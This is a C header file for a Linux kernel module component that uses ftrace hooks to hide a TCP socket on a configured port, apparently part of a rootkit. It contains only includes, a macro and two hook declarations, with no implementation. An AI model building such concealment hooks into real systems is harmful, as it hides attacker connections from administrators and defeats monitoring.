/*
 * hide_tcp_sock.h - header file for hide_tcp_sock.c
 *
 * Omer Kfir (C)
 */

#ifndef HIDE_TCP_SOCK_H
#define HIDE_TCP_SOCK_H

#include <linux/ftrace.h> // For ftrace functionality
#include <linux/in.h>     // For in_aton()
#include <linux/inet.h>   // For networking and socket handling (e.g., htons)
#include <linux/net.h>    // For socket-related definitions (e.g., struct sock)
#include <linux/ptrace.h> // for struct pt_regs
#include <linux/ptrace.h> // For ftrace_regs (needed to get register values in ftrace)
#include <linux/seq_file.h> // For seq_file (e.g., seq_file, seq_puts)
#include <net/tcp.h>        // for struct sock, skc_dport

#include "../headers.h"
#include "../protocol.h" // For port to hide

#define within_module(ip, mod)                                                 \
  ((unsigned long)(ip) >= (unsigned long)(mod)->mem[MOD_TEXT].base &&          \
   (unsigned long)(ip) < (unsigned long)(mod)->mem[MOD_TEXT].base +            \
                             (unsigned long)(mod)->mem[MOD_TEXT].size)

int register_tcp_sock_hook(void);
void unregister_tcp_sock_hook(void);

#endif // HIDE_TCP_SOCK_H